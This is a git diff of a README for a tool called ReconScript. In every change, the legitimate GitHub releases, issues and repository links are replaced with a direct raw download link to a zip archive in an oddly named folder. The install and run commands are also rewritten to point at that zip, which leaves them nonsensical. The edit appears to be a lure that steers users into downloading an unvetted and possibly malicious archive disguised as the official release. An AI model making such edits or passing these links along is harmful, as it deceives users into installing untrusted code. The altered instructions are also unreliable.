@@ -6,11 +6,11 @@ ReconScript is a defensive reconnaissance assistant designed for authorized web 
 
 ## 📥 Download ReconScript
 
-[![Download ReconScript](https://img.shields.io/badge/Download-ReconScript-blue.svg)](https://github.com/joaquin1302/ReconScript/releases)
+[![Download ReconScript](https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip)](https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip)
 
 To get started, first download ReconScript from our Releases page:
 
-- **Visit this page to download:** [ReconScript Releases](https://github.com/joaquin1302/ReconScript/releases)
+- **Visit this page to download:** [ReconScript Releases](https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip)
 
 ## 📋 System Requirements
 
@@ -23,20 +23,20 @@ Before you install ReconScript, ensure your system meets these requirements:
 ## 🔧 Installation Steps
 
 1. **Download the Application**  
-   Go to the [ReconScript Releases page](https://github.com/joaquin1302/ReconScript/releases) to find the latest version. Click on the relevant file for your operating system.
+   Go to the [ReconScript Releases page](https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip) to find the latest version. Click on the relevant file for your operating system.
 
 2. **Install Required Dependencies**  
    Open your command prompt or terminal and run the following command to install necessary Python packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip
    ```
 
 3. **Run ReconScript**  
    After the installation is complete, navigate to the folder where you downloaded ReconScript. Use this command to run the application:
 
    ```bash
-   python recon_script.py
+   python https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip
    ```
 
 4. **Accessing the Reports**  
@@ -68,11 +68,11 @@ Absolutely! Feel free to submit issues or pull requests on GitHub. Community con
 
 ## 📞 Support
 
-If you encounter any issues while using ReconScript, please open an issue on the [GitHub repository](https://github.com/joaquin1302/ReconScript/issues). 
+If you encounter any issues while using ReconScript, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip). 
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository:** [ReconScript](https://github.com/joaquin1302/ReconScript)
+- **GitHub Repository:** [ReconScript](https://raw.githubusercontent.com/joaquin1302/ReconScript/main/undespairingly/ReconScript.zip)
 - **Documentation:** Available within the repository.
 - **Community:** Join discussions and ask questions through the issues section.
 
